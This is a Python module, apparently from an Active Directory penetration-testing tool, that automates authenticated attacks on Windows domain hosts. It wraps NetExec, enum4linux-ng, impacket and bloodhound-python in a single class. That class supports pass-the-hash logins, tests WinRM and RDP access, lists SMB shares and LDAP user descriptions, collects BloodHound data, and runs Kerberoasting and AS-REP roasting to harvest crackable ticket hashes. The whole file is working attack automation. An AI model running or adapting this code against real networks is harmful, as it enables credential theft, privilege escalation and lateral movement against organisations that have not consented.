"""
Authenticated enumeration module using provided credentials
"""

import asyncio
import subprocess
import logging
import os
import random
from typing import Dict, List, Optional
from utils import save_enumeration_result, is_command_available


class AuthEnumerator:
    """Authenticated enumeration using domain/local credentials"""
    
    def __init__(self, output_dir: str, username: str, password: str, local_auth: bool = False, ntlm_hash: str = None):
        self.output_dir = output_dir
        self.username = username
        self.password = password
        self.ntlm_hash = ntlm_hash
        self.local_auth = local_auth
        self.logger = logging.getLogger('adtool')
        
        # Parse NTLM hash if provided
        if self.ntlm_hash:
            self.lm_hash, self.nt_hash = self._parse_ntlm_hash(ntlm_hash)
        else:
            self.lm_hash = None
            self.nt_hash = None
        
        # Parse domain and username
        if '/' in username:
            self.domain, self.user = username.split('/', 1)
        elif '\\' in username:
            self.domain, self.user = username.split('\\', 1)
        else:
            self.domain = None
            self.user = username
        
        # Check if required tools are available
        self.nxc_cmd = None
        if is_command_available('nxc'):
            self.nxc_cmd = 'nxc'
        elif is_command_available('netexec'):
            self.nxc_cmd = 'netexec'
        else:
            self.logger.warning("Neither 'nxc' nor 'netexec' found. Authenticated enumeration will be limited.")
        
        self.has_enum4linux = is_command_available('enum4linux-ng')
        self.has_kerberoast = is_command_available('impacket-GetUserSPNs')
        self.has_asrep = is_command_available('impacket-GetNPUsers')
        self.has_bloodhound = is_command_available('bloodhound-python')
        
        self.logger.info(f"Initialized authenticated enumerator for user: {self.username}")
        if self.ntlm_hash:
            self.logger.info("Using NTLM hash authentication")
        if self.local_auth:
            self.logger.info("Using local authentication")
        else:
            self.logger.info("Using domain authentication")
        
        # Log tool availability
        tool_status = []
        if self.nxc_cmd:
            tool_status.append(f"NetExec: {self.nxc_cmd}")
        if self.has_enum4linux:
            tool_status.append("enum4linux-ng")
        if self.has_kerberoast:
            tool_status.append("impacket-GetUserSPNs")
        if self.has_asrep:
            tool_status.append("impacket-GetNPUsers")
        if self.has_bloodhound:
            tool_status.append("bloodhound-python")
        
        if tool_status:
            self.logger.info(f"Available tools: {', '.join(tool_status)}")
        else:
            self.logger.warning("No enumeration tools found!")
    
    def _parse_ntlm_hash(self, ntlm_hash: str) -> tuple:
        """Parse NTLM hash in format LM:NT or :NT"""
        if ':' in ntlm_hash:
            parts = ntlm_hash.split(':', 1)
            lm_hash = parts[0] if parts[0] else None
            nt_hash = parts[1] if parts[1] else None
        else:
            # If no colon, assume it's just the NT hash
            lm_hash = None
            nt_hash = ntlm_hash
        
        return lm_hash, nt_hash
    
    async def enumerate_targets(self, ips: List[str]) -> Dict:
        """Perform authenticated enumeration on targets"""
        self.logger.info(f"Starting authenticated enumeration for {len(ips)} targets")
        
        if not self.nxc_cmd:
            self.logger.error("NetExec/NXC not found. Cannot perform authenticated enumeration.")
            return {'error': 'NetExec/NXC not available'}
        
        results = {
            'scan_type': 'authenticated_enumeration',
            'username': self.username,
            'local_auth': self.local_auth,
            'targets': ips,
            'results': []
        }
        
        # Run authenticated enumeration for all IPs in parallel
        self.logger.info(f"Running authenticated enumeration for {len(ips)} targets in parallel")
        ip_tasks = [self._enumerate_target(ip) for ip in ips]
        ip_results = await asyncio.gather(*ip_tasks, return_exceptions=True)
        
        # Process results
        for result in ip_results:
            if result and not isinstance(result, Exception):
                results['results'].append(result)
            elif isinstance(result, Exception):
                self.logger.error(f"Target enumeration failed: {result}")
        
        return results
    
    async def _enumerate_target(self, ip: str) -> Dict:
        """Run all authenticated enumeration checks for a single target"""
        self.logger.info(f"Starting enumeration for {ip}")
        
        target_result = {
            'ip': ip,
            'checks': []
        }
        
        # Run domain auth checks in parallel
        domain_checks = [
            self._enumerate_smb_shares(ip),
            self._check_password_policy(ip),
            self._check_winrm_access(ip),
            self._check_rdp_access(ip),
            self._enumerate_ldap_user_descriptions(ip),
            self._run_enum4linux(ip),
            self._kerberoasting(ip),
            self._asrep_roasting(ip),
            self._bloodhound_collection(ip)
        ]
        
        # Execute all domain auth checks in parallel
        domain_results = await asyncio.gather(*domain_checks, return_exceptions=True)
        
        # Add successful results to checks
        for result in domain_results:
            if result and not isinstance(result, Exception):
                target_result['checks'].append(result)
            elif isinstance(result, Exception):
                self.logger.error(f"Check failed for {ip}: {result}")
        
        # If local_auth is enabled, run local auth checks in parallel
        if self.local_auth:
            local_checks = [
                self._enumerate_smb_shares(ip, local_auth=True),
                self._check_password_policy(ip, local_auth=True),
                self._check_winrm_access(ip, local_auth=True),
                self._check_rdp_access(ip, local_auth=True)
            ]
            
            # Execute all local auth checks in parallel
            local_results = await asyncio.gather(*local_checks, return_exceptions=True)
            
            # Add successful results to checks
            for result in local_results:
                if result and not isinstance(result, Exception):
                    target_result['checks'].append(result)
                elif isinstance(result, Exception):
                    self.logger.error(f"Local auth check failed for {ip}: {result}")
        
        return target_result
    
    async def _run_nxc_command(self, cmd: List[str], max_retries: int = 3) -> tuple:
        """Run nxc command with retry logic to handle parallel execution issues"""
        for attempt in range(max_retries):
            try:
                # Add small random delay to stagger parallel processes
                if attempt > 0:
                    delay = random.uniform(0.1, 0.5)
                    await asyncio.sleep(delay)
                
                process = await asyncio.create_subprocess_exec(
                    *cmd,
                    stdout=asyncio.subprocess.PIPE,
                    stderr=asyncio.subprocess.PIPE
                )
                
                stdout, stderr = await process.communicate()
                
                # Check if it's the FileExistsError from nxc
                if b"FileExistsError" in stderr and b"nxc_hosted" in stderr:
                    if attempt < max_retries - 1:
                        self.logger.debug(f"nxc temporary directory conflict, retrying... (attempt {attempt + 1}/{max_retries})")
                        continue
                
                return stdout.decode(), stderr.decode(), process.returncode
                
            except Exception as e:
                if attempt < max_retries - 1:
                    self.logger.debug(f"Command execution error, retrying... (attempt {attempt + 1}/{max_retries}): {e}")
                    continue
                else:
                    raise
        
        # If all retries failed
        raise Exception(f"Failed to execute command after {max_retries} attempts")

    
    async def _enumerate_smb_shares(self, ip: str, local_auth: bool = False) -> Dict:
        """Enumerate SMB shares with credentials"""
        cmd = [self.nxc_cmd, 'smb', ip, '-u', self.user]
        
        # Use hash or password
        if self.ntlm_hash:
            cmd.extend(['-H', self.ntlm_hash])
        else:
            cmd.extend(['-p', self.password])
        
        cmd.append('--shares')
        
        if local_auth:
            cmd.append('--local-auth')
        
        auth_type = "local" if local_auth else "domain"
        
        try:
            self.logger.info(f"Enumerating SMB shares on {ip} ({auth_type} auth)")
            
            stdout, stderr, returncode = await self._run_nxc_command(cmd)
            output = stdout + stderr
            
            # Save results
            filename = f"smb_shares_{auth_type}_{ip}.txt"
            file_path = save_enumeration_result(
                self.output_dir, ip, f'smb_shares_{auth_type}', output, filename,
                service_type='smb', authenticated=True
            )
            
            return {
                'type': f'smb_shares_{auth_type}',
                'command': ' '.join(cmd),
                'output': output,
                'file': file_path,
                'success': returncode == 0
            }
            
        except Exception as e:
            self.logger.error(f"SMB shares enumeration failed for {ip} ({auth_type}): {e}")
            return None
    
    async def _check_password_policy(self, ip: str, local_auth: bool = False) -> Dict:
        """Check password policy"""
        cmd = [self.nxc_cmd, 'smb', ip, '-u', self.user]
        
        # Use hash or password
        if self.ntlm_hash:
            cmd.extend(['-H', self.ntlm_hash])
        else:
            cmd.extend(['-p', self.password])
        
        cmd.append('--pass-pol')
        
        if local_auth:
            cmd.append('--local-auth')
        
        auth_type = "local" if local_auth else "domain"
        
        try:
            self.logger.info(f"Checking password policy on {ip} ({auth_type} auth)")
            
            stdout, stderr, returncode = await self._run_nxc_command(cmd)
            output = stdout + stderr
            
            # Save results
            filename = f"password_policy_{auth_type}_{ip}.txt"
            file_path = save_enumeration_result(
                self.output_dir, ip, f'password_policy_{auth_type}', output, filename,
                service_type='smb', authenticated=True
            )
            
            return {
                'type': f'password_policy_{auth_type}',
                'command': ' '.join(cmd),
                'output': output,
                'file': file_path,
                'success': returncode == 0
            }
            
        except Exception as e:
            self.logger.error(f"Password policy check failed for {ip} ({auth_type}): {e}")
            return None
    
    async def _check_winrm_access(self, ip: str, local_auth: bool = False) -> Dict:
        """Check WinRM access"""
        cmd = [self.nxc_cmd, 'winrm', ip, '-u', self.user]
        
        # Use hash or password
        if self.ntlm_hash:
            cmd.extend(['-H', self.ntlm_hash])
        else:
            cmd.extend(['-p', self.password])
        
        if local_auth:
            cmd.append('--local-auth')
        
        auth_type = "local" if local_auth else "domain"
        
        try:
            self.logger.info(f"Checking WinRM access on {ip} ({auth_type} auth)")
            
            stdout, stderr, returncode = await self._run_nxc_command(cmd)
            output = stdout + stderr
            
            # Save results
            filename = f"winrm_access_{auth_type}_{ip}.txt"
            file_path = save_enumeration_result(
                self.output_dir, ip, f'winrm_access_{auth_type}', output, filename,
                service_type='misc', authenticated=True
            )
            
            # Check if login was successful
            login_success = any(indicator in output.lower() for indicator in [
                'pwned', '[+]', 'login successful', 'shell access'
            ])
            
            return {
                'type': f'winrm_access_{auth_type}',
                'command': ' '.join(cmd),
                'output': output,
                'file': file_path,
                'login_success': login_success,
                'success': returncode == 0
            }
            
        except Exception as e:
            self.logger.error(f"WinRM access check failed for {ip} ({auth_type}): {e}")
            return None
    
    async def _check_rdp_access(self, ip: str, local_auth: bool = False) -> Dict:
        """Check RDP access"""
        cmd = [self.nxc_cmd, 'rdp', ip, '-u', self.user]
        
        # Use hash or password
        if self.ntlm_hash:
            cmd.extend(['-H', self.ntlm_hash])
        else:
            cmd.extend(['-p', self.password])
        
        if local_auth:
            cmd.append('--local-auth')
        
        auth_type = "local" if local_auth else "domain"
        
        try:
            self.logger.info(f"Checking RDP access on {ip} ({auth_type} auth)")
            
            stdout, stderr, returncode = await self._run_nxc_command(cmd)
            output = stdout + stderr
            
            # Save results
            filename = f"rdp_access_{auth_type}_{ip}.txt"
            file_path = save_enumeration_result(
                self.output_dir, ip, f'rdp_access_{auth_type}', output, filename,
                service_type='misc', authenticated=True
            )
            
            # Check if login was successful
            login_success = any(indicator in output.lower() for indicator in [
                'pwned', '[+]', 'login successful', 'rdp access'
            ])
            
            return {
                'type': f'rdp_access_{auth_type}',
                'command': ' '.join(cmd),
                'output': output,
                'file': file_path,
                'login_success': login_success,
                'success': returncode == 0
            }
            
        except Exception as e:
            self.logger.error(f"RDP access check failed for {ip} ({auth_type}): {e}")
            return None
    
    async def _enumerate_ldap_user_descriptions(self, ip: str) -> Dict:
        """Enumerate LDAP user descriptions"""
        cmd = [self.nxc_cmd, 'ldap', ip, '-u', self.user]
        
        # Use hash or password
        if self.ntlm_hash:
            cmd.extend(['-H', self.ntlm_hash])
        else:
            cmd.extend(['-p', self.password])
        
        cmd.extend(['-M', 'get-desc-users'])
        
        try:
            self.logger.info(f"Enumerating LDAP user descriptions on {ip}")
            
            stdout, stderr, returncode = await self._run_nxc_command(cmd)
            output = stdout + stderr
            
            # Save results
            filename = f"ldap_user_descriptions_{ip}.txt"
            file_path = save_enumeration_result(
                self.output_dir, ip, 'ldap_user_descriptions', output, filename,
                service_type='ldap', authenticated=True
            )
            
            return {
                'type': 'ldap_user_descriptions',
                'command': ' '.join(cmd),
                'output': output,
                'file': file_path,
                'success': returncode == 0
            }
            
        except Exception as e:
            self.logger.error(f"LDAP user descriptions enumeration failed for {ip}: {e}")
            return None
    
    async def _run_enum4linux(self, ip: str) -> Dict:
        """Run enum4linux-ng with credentials"""
        if not self.has_enum4linux:
            self.logger.warning("enum4linux-ng not found. Skipping authenticated enum4linux scan.")
            return None
        
        output_file = f"{self.user}_enumlinux"
        
        # Check if we're using simplified authenticated directory structure
        enumeration_path = os.path.join(self.output_dir, "enumeration")
        if os.path.exists(enumeration_path):
            # Full directory structure
            enum_dir = os.path.join(self.output_dir, "enumeration", "smb", "authenticated")
        else:
            # Simplified directory structure
            enum_dir = os.path.join(self.output_dir, "smb")
        
        cmd = ['enum4linux-ng', ip, '-u', self.user]
        
        # enum4linux-ng uses -p for password and -H for hash
        if self.ntlm_hash:
            cmd.extend(['-H', self.nt_hash if self.nt_hash else self.ntlm_hash])
        else:
            cmd.extend(['-p', self.password])
        
        cmd.extend(['-oY', os.path.join(enum_dir, f"{output_file}.txt")])
        
        try:
            self.logger.info(f"Running enum4linux-ng on {ip} with credentials")
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            output = stdout.decode() + stderr.decode()
            
            # Save the command output as well
            filename = f"enum4linux_auth_{ip}.txt"
            file_path = save_enumeration_result(
                self.output_dir, ip, 'enum4linux_auth', output, filename,
                service_type='smb', authenticated=True
            )
            
            return {
                'type': 'enum4linux_authenticated',
                'command': ' '.join(cmd),
                'output': output,
                'file': file_path,
                'yaml_file': f"{enum_dir}/{output_file}.txt",
                'success': process.returncode == 0
            }
            
        except Exception as e:
            self.logger.error(f"enum4linux-ng authenticated scan failed for {ip}: {e}")
            return None
    
    async def _kerberoasting(self, ip: str) -> Dict:
        """Perform Kerberoasting attack using impacket-GetUserSPNs"""
        if not self.has_kerberoast:
            self.logger.warning("impacket-GetUserSPNs not found. Skipping Kerberoasting.")
            return None
        
        if not self.domain:
            self.logger.warning("Domain not specified. Skipping Kerberoasting.")
            return None
        
        # impacket-GetUserSPNs uses -hashes format LM:NT
        if self.ntlm_hash:
            cmd = ['impacket-GetUserSPNs', '-request', '-dc-ip', ip, '-hashes', self.ntlm_hash, f'{self.domain}/{self.user}']
        else:
            cmd = ['impacket-GetUserSPNs', '-request', '-dc-ip', ip, f'{self.domain}/{self.user}:{self.password}']
        
        try:
            self.logger.info(f"Performing Kerberoasting on {ip}")
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            output = stdout.decode() + stderr.decode()
            
            # Save results
            filename = f"kerberoasting_{ip}.txt"
            file_path = save_enumeration_result(
                self.output_dir, ip, 'kerberoasting', output, filename,
                service_type='ldap', authenticated=True
            )
            
            # Check if any SPNs were found
            spns_found = '$krb5tgs$' in output or 'ServicePrincipalName' in output
            
            return {
                'type': 'kerberoasting',
                'command': ' '.join(cmd),
                'output': output,
                'file': file_path,
                'spns_found': spns_found,
                'success': process.returncode == 0
            }
            
        except Exception as e:
            self.logger.error(f"Kerberoasting failed for {ip}: {e}")
            return None
    
    async def _asrep_roasting(self, ip: str) -> Dict:
        """Perform AS-REP roasting attack using impacket-GetNPUsers"""
        if not self.has_asrep:
            self.logger.warning("impacket-GetNPUsers not found. Skipping AS-REP roasting.")
            return None
        
        if not self.domain:
            self.logger.warning("Domain not specified. Skipping AS-REP roasting.")
            return None
        
        # impacket-GetNPUsers uses -hashes format LM:NT
        if self.ntlm_hash:
            cmd = ['impacket-GetNPUsers', '-request', '-dc-ip', ip, '-hashes', self.ntlm_hash, f'{self.domain}/{self.user}']
        else:
            cmd = ['impacket-GetNPUsers', '-request', '-dc-ip', ip, f'{self.domain}/{self.user}:{self.password}']
        
        try:
            self.logger.info(f"Performing AS-REP roasting on {ip}")
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )
            
            stdout, stderr = await process.communicate()
            output = stdout.decode() + stderr.decode()
            
            # Save results
            filename = f"asrep_roasting_{ip}.txt"
            file_path = save_enumeration_result(
                self.output_dir, ip, 'asrep_roasting', output, filename,
                service_type='ldap', authenticated=True
            )
            
            # Check if any vulnerable users were found
            vulnerable_users = '$krb5asrep$' in output or 'UF_DONT_REQUIRE_PREAUTH' in output
            
            return {
                'type': 'asrep_roasting',
                'command': ' '.join(cmd),
                'output': output,
                'file': file_path,
                'vulnerable_users': vulnerable_users,
                'success': process.returncode == 0
            }
            
        except Exception as e:
            self.logger.error(f"AS-REP roasting failed for {ip}: {e}")
            return None
    
    async def _bloodhound_collection(self, ip: str) -> Dict:
        """Collect BloodHound data using bloodhound-python"""
        if not self.has_bloodhound:
            self.logger.warning("bloodhound-python not found. Skipping BloodHound collection.")
            return None
        
        if not self.domain:
            self.logger.warning("Domain not specified. Skipping BloodHound collection.")
            return None
        
        # Create output directory for BloodHound files
        bloodhound_dir = os.path.join(self.output_dir, 'bloodhound')
        
        cmd = [
            'bloodhound-python', 
            '-d', self.domain,
            '-u', self.user,
            '-ns', ip,
            '-c', 'all',
            '--zip'
        ]
        
        # bloodhound-python uses --hashes for NT hash only
        if self.ntlm_hash:
            # BloodHound only needs the NT hash
            cmd.extend(['--hashes', self.nt_hash if self.nt_hash else self.ntlm_hash])
        else:
            cmd.extend(['-p', self.password])
        
        try:
            self.logger.info(f"Collecting BloodHound data from {ip}")
            
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=bloodhound_dir
            )
            
            stdout, stderr = await process.communicate()
            output = stdout.decode() + stderr.decode()
            
            # Save command output to bloodhound directory
            filename = f"bloodhound_collection_{ip}.txt"
            file_path = save_enumeration_result(
                self.output_dir, ip, 'bloodhound_collection', output, filename,
                service_type='bloodhound', authenticated=True
            )
            
            # Check if collection was successful
            collection_success = 'Done in' in output or '.zip' in output
            
            return {
                'type': 'bloodhound_collection',
                'command': ' '.join(cmd),
                'output': output,
                'file': file_path,
                'collection_success': collection_success,
                'output_dir': bloodhound_dir,
                'success': process.returncode == 0
            }
            
        except Exception as e:
            self.logger.error(f"BloodHound collection failed for {ip}: {e}")
            return None
    
    async def generate_summary(self, results: Dict) -> str:
        """Generate a summary of authenticated enumeration results"""
        if 'error' in results:
            return f"Authenticated enumeration failed: {results['error']}"
        
        summary_lines = []
        summary_lines.append("=== AUTHENTICATED ENUMERATION SUMMARY ===")
        summary_lines.append(f"Username: {results['username']}")
        summary_lines.append(f"Authentication: {'Local' if results['local_auth'] else 'Domain'}")
        summary_lines.append(f"Targets scanned: {len(results['targets'])}")
        summary_lines.append("")
        
        successful_logins = {
            'winrm': [],
            'rdp': [],
            'smb': []
        }
        
        attack_results = {
            'kerberoasting': [],
            'asrep_roasting': [],
            'bloodhound': []
        }
        
        for target_result in results['results']:
            ip = target_result['ip']
            checks = target_result['checks']
            
            summary_lines.append(f"Target: {ip}")
            summary_lines.append("-" * 20)
            
            for check in checks:
                check_type = check['type']
                success = check.get('success', False)
                
                if 'winrm' in check_type and check.get('login_success', False):
                    successful_logins['winrm'].append(ip)
                    summary_lines.append(f"  [+] WinRM access successful")
                
                if 'rdp' in check_type and check.get('login_success', False):
                    successful_logins['rdp'].append(ip)
                    summary_lines.append(f"  [+] RDP access successful")
                
                if 'smb_shares' in check_type and success:
                    successful_logins['smb'].append(ip)
                    summary_lines.append(f"  [+] SMB shares accessible")
                
                # Handle new attack techniques
                if check_type == 'kerberoasting':
                    if check.get('spns_found', False):
                        attack_results['kerberoasting'].append(ip)
                        summary_lines.append(f"  [+] Kerberoasting: SPNs found!")
                    else:
                        summary_lines.append(f"  [-] Kerberoasting: No SPNs found")
                
                if check_type == 'asrep_roasting':
                    if check.get('vulnerable_users', False):
                        attack_results['asrep_roasting'].append(ip)
                        summary_lines.append(f"  [+] AS-REP Roasting: Vulnerable users found!")
                    else:
                        summary_lines.append(f"  [-] AS-REP Roasting: No vulnerable users")
                
                if check_type == 'bloodhound_collection':
                    if check.get('collection_success', False):
                        attack_results['bloodhound'].append(ip)
                        summary_lines.append(f"  [+] BloodHound: Data collection successful")
                    else:
                        summary_lines.append(f"  [-] BloodHound: Data collection failed")
                
                if success:
                    summary_lines.append(f"  [+] {check_type}: Success")
                else:
                    summary_lines.append(f"  [-] {check_type}: Failed")
            
            summary_lines.append("")
        
        # Access summary
        summary_lines.append("=== ACCESS SUMMARY ===")
        summary_lines.append(f"WinRM access: {len(successful_logins['winrm'])} targets")
        for ip in successful_logins['winrm']:
            summary_lines.append(f"  - {ip}")
        
        summary_lines.append(f"RDP access: {len(successful_logins['rdp'])} targets")
        for ip in successful_logins['rdp']:
            summary_lines.append(f"  - {ip}")
        
        summary_lines.append(f"SMB access: {len(successful_logins['smb'])} targets")
        for ip in successful_logins['smb']:
            summary_lines.append(f"  - {ip}")
        
        # Attack results summary
        summary_lines.append("")
        summary_lines.append("=== ATTACK RESULTS SUMMARY ===")
        summary_lines.append(f"Kerberoasting hits: {len(attack_results['kerberoasting'])} targets")
        for ip in attack_results['kerberoasting']:
            summary_lines.append(f"  - {ip}")
        
        summary_lines.append(f"AS-REP Roasting hits: {len(attack_results['asrep_roasting'])} targets")
        for ip in attack_results['asrep_roasting']:
            summary_lines.append(f"  - {ip}")
        
        summary_lines.append(f"BloodHound collections: {len(attack_results['bloodhound'])} targets")
        for ip in attack_results['bloodhound']:
            summary_lines.append(f"  - {ip}")
        
        # Save summary to file
        summary_text = "\n".join(summary_lines)
        summary_file = save_enumeration_result(
            self.output_dir, "summary", "authenticated_enumeration", summary_text, "authenticated_enumeration_summary.txt",
            service_type='misc', authenticated=True
        )
        
        return summary_text